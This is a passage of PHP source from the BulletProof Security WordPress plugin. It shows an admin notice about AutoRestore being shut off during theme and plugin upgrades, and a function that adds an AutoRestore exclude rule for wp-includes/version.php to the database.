			$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;"><font color="blue">'.__('BPS Pro AutoRestore (ARQ) Automatic Shutdown & Backup Notice', 'bulletproof-security').'</font><br>'.__('ARQ is automatically turned Off during manual WordPress upgrades, new Theme installations and Theme or Plugin upgrades.', 'bulletproof-security').'<br>'.__('For new Theme installations or Theme and Plugin upgrades click the link below AFTER Theme or Plugin installation has completed.', 'bulletproof-security').'<br><a href="about.php">'.__('Complete AutoRestore file backup and turn AutoRestore back On.', 'bulletproof-security').'</a></div>';
			echo $text;
		}
	}
}

add_action('admin_notices', 'bpsPro_ARQ_doing_upgrade_new_install');
add_action('network_admin_notices', 'bpsPro_ARQ_doing_upgrade_new_install');

// BPS Pro Upgrades & Setup Wizard - Create ARQ Exclude rule for /wp-includes/version.php 
function bps_wp_versionphp_exclude_rule() {

	if ( current_user_can('manage_options') ) {

	global $wpdb;
	$versionphp = ABSPATH . 'wp-includes/version.php';	
	$versionphpDB = 'version.php';
	$Etable_name = $wpdb->prefix . "bpspro_arq_exclude";
	$getExcludeRows = $wpdb->get_results( $wpdb->prepare("SELECT * FROM $Etable_name WHERE arq_exclude_source LIKE %s", "%$versionphpDB%") );	
		
		foreach ( $getExcludeRows as $row ) {
			if ( $row->arq_exclude_source == $versionphp ) {		
				return;
			}
		}

		if ( file_exists($versionphp) ) {	
			$Excludeversionphp = $wpdb->insert( $Etable_name, array( 'time' => current_time('mysql'), 'arq_exclude_source' => $versionphp ) );
		}
	}
}

?>